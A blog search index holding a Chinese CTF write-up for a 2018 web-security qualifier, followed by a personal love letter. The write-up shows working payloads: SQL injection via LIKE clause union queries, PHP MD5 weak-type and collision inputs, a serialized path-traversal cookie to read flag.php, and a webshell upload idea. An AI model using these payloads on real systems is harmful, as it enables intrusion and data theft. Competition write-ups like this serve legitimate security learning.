<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2018WEB安全测试秋季预选赛WriteUp]]></title>
    <url>%2F2018%2F10%2F28%2F1%2F</url>
    <content type="text"><![CDATA[题记：学校组织参加这个比赛，对于没有信安专业的学院来说，参赛重点就是嵌入式与开发者，留下我们自生自灭，在此记录一下，刷下一存在感吧，虽然没拿到理想结果，毕竟来过233333。错误的地方，欢迎大佬们指正。 2018WEB安全测试秋季预选赛 0x01 input传送门：http://114.55.36.69:8003/题目上说前三道题目是容易的，于是就从容易的题目入手，为了拿到1血，手速飞快地点，emmm，一紧张忘了js输出语句怎么写了，百度后才发现，自己有多蠢alert啊！ 进入网址，发现一个输入框，查看源码，发现id=”flag”，后面有一段js代码 123456789101112&lt;script&gt; function check()&#123; var flag = document.getElementById(&quot;flag&quot;).value; var str = &quot;d84d9657e5e5e&quot; || 0; var str = str + (&quot;ad2ad3fe&quot; &amp;&amp; 2); var str = str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;; var str = str.split(&quot;&quot;).reverse().join(&quot;&quot;); if (str == flag)&#123; alert(&quot;恭喜你已经找到flag！&quot;); &#125; &#125;&lt;/script&gt; 二话不说，直接console下执行，emmmm，可惜一下。提交即可 0x02 MD5传送门：http://114.55.36.69:8004/ 打开后发现一段文字：easy MD5 cracking fail。应该与MD5有关，简单的就是弱类型，再不就是MD5碰撞，查看源码，发现是考察PHP弱类型 1easy MD5 cracking &lt;!--$_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;]--&gt;fail 脑补一下剩下的代码 123if(($_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;])&amp;&amp;(md5($_POST[&apos;data1&apos;])==md5($_POST[&apos;data2&apos;])) echo $flag; 于是post传参：data1=QNKCDZO&amp;data2=240610708，得到答案 0x03 参数提交传送门：http://114.55.36.69:8012/ flag作为参数，post方式提交，提示必须大于10位，提交flag=11111111111，即可得到flag。-.- 0x04 新闻查询传送门：http://114.55.36.69:8010/ 先上图有关键词，有条数，初步猜测是注入，关键词输入1’发现查看源码，发现前端过滤 123456789101112131415161718function myFunction() &#123; var x=document.getElementById(&quot;number&quot;).value; var a=document.getElementById(&quot;word&quot;).value; var b=a.replace(/[\ |\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&apos;|\,|\&lt;|\.|\&gt;|\/|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]/g,&quot;&quot;); if(a.length!=b.length) &#123; alert(&quot;请输入正确字符。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; document.getElementById(&quot;word&quot;).value = &apos;&apos;; &#125; else if(isNaN(x)) &#123; alert(&quot;请输入数字。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; &#125; &#125; 于是手动禁掉js代码，并且猜测后端代码是关键词处查询处存在sql注入一直尝试，却没有任何回显，突然听说可以sqlmap直接跑，于是sqlmap启动！保存请求包，sqlmap -r payload.txt –dump当时时间也是关键，能出flag就可以，写这个时候，才手动注入，像这种的关键词查询，一般都是使用like%%的模糊查询,所以需要闭合%，构造payload：1%’ AND 1=1 AND ‘%’=’成功注入这里对like%%进行一些了解首先我们在本地数据库中输入12345678910111213141516mysql&gt; select * from tests where password like &apos;%a%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password || admin | admin |+---------+----------+2 rows in set (0.00 sec)mysql&gt; select * from tests where password like &apos;%as%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password |+---------+----------+1 row in set (0.00 sec) 可以发现like%$value%相当于/.*$value.*/，如果注入的话，我们需要闭合前面的%’,而且还有闭合后面的%’红框里面的内容为外部输入。了解完like%%的注入，接着看题目123456789# 得到列payload: 1%&apos; order by 3-- 返回正常payload: 1%&apos; order by 4--返回异常得知表有为3列# 找回显点payload: 1%&apos; union select 1,2,3-- 在页面下面出现1,2，3 12# 注入表，列，字段，此处省略过程payload: 1%&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()),flag from admin-- 成功拿到flag 0x05 MD5碰撞传送门：http://114.55.36.69:8006/ 又是一个关于MD5的题目，而且提示依然为：MD5 crackingfail。这样从分值与顺序看起来，不出意外就是MD5碰撞，查看源码发现1if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;])) 这里两边都是强判断===，并且强制转换为string类型进行比较，听表哥说，只能通过md5碰撞绕过去先了解一下什么是md5碰撞12## md5碰撞从根本上讲，MD5算法是一种摘要算法，它可以从多个字节组成的串中计算出由32个字节构成的“特征串”。对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在两个（或更多）不同的串能够得出相同MD5值的情况。这种情况就叫做MD5碰撞。 我们需要找到两个字符串不一样，但是MD5值一模一样的字符串，用MD5碰撞生成器生成 12345678910&gt; fastcoll_v1.0.0.5.exe -o data1.txt data2.txtMD5 collision generator v1.5by Marc Stevens (http://www.win.tue.nl/hashclash/)Using output filenames: &apos;data1.txt&apos; and &apos;data2.txt&apos;Using initial value: 0123456789abcdeffedcba9876543210Generating first block: .............Generating second block: S01.....Running time: 8.187 s 然后对data1.txt与data2.txt中的内容进行url编码后，curl发请求，或者在该网址中找，即可得到flag123456789101112131415161718192021222324root@Kali:~# curl -v http://114.55.36.69:8006/ -H &quot;Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&quot; --data &quot;data1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;data2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;* Hostname was NOT found in DNS cache* Trying 114.55.36.69...* Connected to 114.55.36.69 (114.55.36.69) port 8006 (#0)&gt; POST / HTTP/1.1&gt; User-Agent: curl/7.38.0&gt; Host: 114.55.36.69:8006&gt; Accept: */*&gt; Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&gt; Content-Length: 315&gt; Content-Type: application/x-www-form-urlencoded&gt; * upload completely sent off: 315 out of 315 bytes&lt; HTTP/1.1 200 OK&lt; Date: Sun, 28 Oct 2018 16:57:05 GMT* Server Apache/2.2.15 (CentOS) is not blacklisted&lt; Server: Apache/2.2.15 (CentOS)&lt; X-Powered-By: PHP/5.3.3&lt; Content-Length: 156&lt; Connection: close&lt; Content-Type: text/html; charset=UTF-8&lt; * Closing connection 0MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;flag&#123;9bd1ee7355b58e53214adb9a37b4cb82&#125; 在这备份几条 12345678# firstM%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2# second4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea24dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2MD5 hash:008ee33a9d58b51cfeb425b0959121c9 0x06 Game传送门：http://114.55.36.69:8011/ 进入界面是一款贪吃蛇游戏，果断看js代码逻辑F12查看源码外面是外部的js脚本，在Source中查看发现于是猜测这一段颜文字应该会有与flag相关的信息，于是console执行一下显然flag是错误的，点击view继续跟进参看12345(function anonymous() &#123;window[&apos;flag&apos;] = &apos;Flag&#123;660332922504a5f06dd871a7fe78ba9c&#125;&apos;;console.log(&quot;Flag&#123; hahahah wrong!! :(&#125;&quot;);&#125;) 得到flag 0x07 Notepad传送门：http://114.55.36.69:8014/index.php/ 功能齐全，直接注册帐号，进入upload修改type（只能传jpg）上传一张图片,然后在picture内查看到发现图片中有一串base64，在bp中查看发现这一串base很长，在请求包的cookie中发现picture值解码发现为php序列化，而且保存的上传文件的文件名猜测picture传入执行文件，然后页面显示文件内容的base64。于是显示index.php页面，手动构造序列化，在这里我们讲一下一组序列化的组成12345678910例子：a:2:&#123;i:0;s:5:&quot;1.jpg&quot;;i:1;s:5:&quot;1.php&quot;;&#125;a的意思就是数组array2说明数组里面有两对值分别为1.jpg与1.phpi作为下标s代表为string类型5表示长度即0=&gt;1.jpg1=&gt;1.php 所以我们可以构造为：a:1:{i:0;s:9:”index.php”;}，base64后为YToxOntpOjA7czo5OiJpbmRleC5waHAiO30=，bp重放查看回显做到这，有两个思路，一个是上传一句话然后getshell，因为路径是爆出来了，仅仅是type限制；第二个是直接才flag在哪，读出来。两种方法都很简单，不做细说，第一种改type为image/jpg后，访问http://114.55.36.69:8014/upload/x.php，然后传入命令find / -name flag*。第二种是测试发现，flag在../../flag.php下，然后构造a:1:{i:0;s:14:”../../flag.php”;}=&gt;YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=，请求1234567891011121314151617# requestGET /index.php/picture HTTP/1.1Host: 114.55.36.69:8014Proxy-Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://114.55.36.69:8014/index.php/pictureAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=1vm2g30rlcqosqsj9ici1rdku1; session=eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJYWEgifQ.DreFfA.iwKT84kXV5efjz90397IoKUYiik# response(part)&lt;img src=&quot;data:image/jpg;base64,PD9waHAKCiRmbGFnID0gImZsYWd7TjRtZV9zUGFjNF9Jc19JbnQzcjNzdDFuZ30iOwplY2hvICJmbGFne1RoaXNfMVNfQV9GNGtlX2YxYUd9IjsK&quot;&gt;# base64解密&lt;?php$flag = &quot;flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;&quot;;echo &quot;flag&#123;This_1S_A_F4ke_f1aG&#125;&quot;; 得到flag emmmm，实力有限，只能做出这么几道，至于排名感觉进不去下一场比赛啊。对于萌新的我，做这几道题目，费劲了一下午，晚上感谢小可爱的陪伴，有你真幸福。题目继续更新中~]]></content>
      <categories>
        <category>CTF</category>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Write to You]]></title>
    <url>%2F2018%2F08%2F04%2F1%2F</url>
    <content type="text"><![CDATA[Cause you are the right time at the right moment You’re the one that’s on my mind Surprise！没想到我会给你写这么一封信吧，我的小可爱！ 其实在之前我也说过，欠你一个正式的表白，但是这短短的四个字——我喜欢你，不能把我想说的全部表达出来，所以从前天开始，我就在做这件事情，毕竟是计算机专业的呀，总该有不一样的表白方式，本来我是想写一个浪漫的动态网页的，后来发现网上的随处可见，毫无新意，只有这么一篇自己写的这封信才是最有意义的！ 你知道嘛？昨天你说我们俩不知不觉地经历这么多事情，然后我不禁地翻开我和你的聊天记录，静静地去体会着当时的情感 我们俩相识是在去年的10月1日，那时我们俩加了QQ，你还记得我们的第一次交流的内容是什么嘛你问我，本部有琴房音乐室什么的吗没想到第一句会是这个 后来就是c语言问题的交流那是在第二天的时候，一个a+b+c的问题，然后我写完把源码就发给你了然后就是sin函数的相加，接着第三个，第四个……就这样继续下去了 还记的第一见面是什么时候嘛？那天你问“学长，我们借c++的书，能帮我借到嘛”“我的还在，什么时候给你”然后在你从火车站把朋友接回来时，我们在南华的大门相遇，说起来南华的东门使我们开始的见证呢不知几年后，我们再一次走到南华东门时，会是什么样的感觉 后来，后来，还有好多事情，当我看记录的时候，仿佛历历在目 记得第一次上课与你聊天的时候，是在汇编课上记得第一次修改PPT，是“十年后”一遍一遍的，最后终于把色调调好了，变的暖多啦 还有呢那次你说“我到支教的地方了”“支教小学”后来在你的空间也看到你发的那条说说，如此的善良 时间一点点的逝去，我们留着故事也一点点地增多那次外联部面试的打印，那次的十佳歌手，那次拿给你衣服，那次……..没想到，不知不觉已经经历了这么多了 你知道我什么时候动心的嘛就是那次南华男神女神评选啦无意中去看了一下却看到了你的照片当然第一眼是怎么这么可爱漂亮了然后就是，一种紧张，一种不安，因为我看到了有好多人赞你 但是又因为之前那件事，让我无法开口 不过呢在火车上，在那一刻，我说出来了“不知不觉地喜欢上你”或者这就是Cause you are the right time at the right moment 后来就发生了一件赔偿的事情“之前才把小黄鸡删除完，陪我”然后就是小黄鸡霸屏 自从那次的表白后早上起来第一件事就是传递我的思念斗图打闹嬉戏当然还有那次，你生的很大的气还有好多好多好多……对你的思念 每天都乐此不疲最主要的是，每天都有还多话可以说，哈哈Q或许这就是爱情吧 说实话，我这是第一次有这样的感觉，我高中追过一个女孩，寒假时在微信里就交代了。当时，可以算是痴情，4年，但是仅仅是单方面的现在，我有你，我喜欢你，我就要珍惜，呵护着你，我想让你知道，你在我心中意味着什么我想让所有人都知道，我的女朋友是多么的幸福！ 一次次的快乐，一次次的着急，一次次的不安，我都能清楚地感觉到You’re the one that’s on my mindI’m falling too fast deeply in love 所以，做我女朋友，好嘛，我愿意去一直照顾你，呵护你，宠着你。 PS：准备了好多好多我们的截图，还有图片，但是图片就是添加不上去，好气记得回去用电脑打开看一下啦，这是我精心制作的网站，有很多浪漫的特效呢，而这篇文章就作为这个网站的第一篇文章啦，也是永远置顶的一篇文章！还有还有I LOVE YOU]]></content>
      <categories>
        <category>LOVE</category>
      </categories>
      <tags>
        <tag>love</tag>
        <tag>literature</tag>
      </tags>
  </entry>
</search>
